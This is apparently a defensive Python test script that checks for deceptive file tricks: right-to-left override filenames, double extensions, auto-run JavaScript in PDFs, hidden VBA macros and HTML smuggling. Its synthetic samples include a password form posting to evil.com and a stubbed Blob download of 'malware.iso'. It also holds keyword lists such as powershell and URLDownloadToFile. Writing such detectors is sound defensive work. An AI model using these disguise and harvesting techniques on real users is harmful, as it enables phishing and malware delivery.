import io
import zipfile
import re
import sys

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

def test_rtlo():
    normal_name = "invoice_2026.pdf"
    # An attacker creates a filename with RTLO: invoice_\u202Efdp.exe -> visually appears as invoice_exe.pdf
    rtlo_name = "invoice_\u202Efdp.exe"
    bidi_chars = {
        '\u202e': 'Right-to-Left Override (RTLO)',
        '\u202d': 'Left-to-Right Override (LTRO)',
        '\u2066': 'Left-to-Right Isolate (LRI)',
        '\u2067': 'Right-to-Left Isolate (RLI)',
        '\u2068': 'First Strong Isolate (FSI)'
    }
    found = [bidi_chars[c] for c in rtlo_name if c in bidi_chars]
    print("[RTLO Test]:", rtlo_name, "-> Detected:", found)

def test_double_ext():
    names = ["report.pdf.exe", "statement.docx.vbs", "photo.jpg   .scr", "legit.pdf"]
    pattern = re.compile(r'\.(pdf|doc|docx|xls|xlsx|jpg|png|txt|csv)\s*\.(exe|scr|js|vbs|hta|lnk|iso|bat|ps1|cmd|wsf|cpl|msi|dll|jar)$', re.IGNORECASE)
    for n in names:
        match = bool(pattern.search(n))
        print(f"[Double Ext Test] {n} -> Deceptive: {match}")

def test_pdf_static():
    # Synthetic PDF with /JavaScript and /OpenAction
    synthetic_pdf = b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\nendobj\n3 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert('Test');) >>\nendobj\n%%EOF"
    tokens = {
        "/JavaScript": bool(re.search(rb'/JavaScript|/JS\b', synthetic_pdf)),
        "/OpenAction": bool(re.search(rb'/OpenAction\b', synthetic_pdf)),
        "/Launch": bool(re.search(rb'/Launch\b', synthetic_pdf)),
        "/EmbeddedFiles": bool(re.search(rb'/EmbeddedFiles\b', synthetic_pdf)),
        "/AA": bool(re.search(rb'/AA\b', synthetic_pdf))
    }
    print("[PDF Static Test] Active features found:", [k for k, v in tokens.items() if v])

def test_ooxml_macro():
    # Build in-memory synthetic zip representing a disguised docx containing vbaProject.bin
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, 'w') as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("word/vbaProject.bin", b"VBA...AutoOpen...Shell('powershell -e')...")
    
    bio.seek(0)
    with zipfile.ZipFile(bio, 'r') as zf:
        names = zf.namelist()
        has_vba = any("vbaProject.bin" in name for name in names)
        suspicious_keywords = []
        if has_vba:
            vba_bytes = zf.read("word/vbaProject.bin")
            kw_patterns = [b"AutoOpen", b"Document_Open", b"Workbook_Open", b"Shell", b"powershell", b"URLDownloadToFile"]
            suspicious_keywords = [kw.decode() for kw in kw_patterns if kw.lower() in vba_bytes.lower()]
    print(f"[OOXML Macro Test] Hidden VBA present: {has_vba}, Keywords: {suspicious_keywords}")

def test_html_smuggling():
    synthetic_html = b"""
    <!DOCTYPE html>
    <html>
    <body>
      <form action="http://evil.com/harvest" method="POST">
        <input type="password" name="pwd">
      </form>
      <script>
        var payload = 'data:application/octet-stream;base64,TVqQAAMAAAA...';
        var blob = new Blob([payload]);
        var url = window.URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.download = 'malware.iso';
      </script>
    </body>
    </html>
    """
    has_pwd_form = bool(re.search(rb'<form[^>]*>.*?<input[^>]*type=["\']?password["\']?', synthetic_html, re.DOTALL | re.IGNORECASE))
    has_blob_smuggle = bool(re.search(rb'new\s+Blob|createObjectURL|\.download\s*=|data:application/octet-stream', synthetic_html, re.IGNORECASE))
    print(f"[HTML Smuggling Test] Credential Form: {has_pwd_form}, Smuggling primitives: {has_blob_smuggle}")

if __name__ == '__main__':
    test_rtlo()
    test_double_ext()
    test_pdf_static()
    test_ooxml_macro()
    test_html_smuggling()
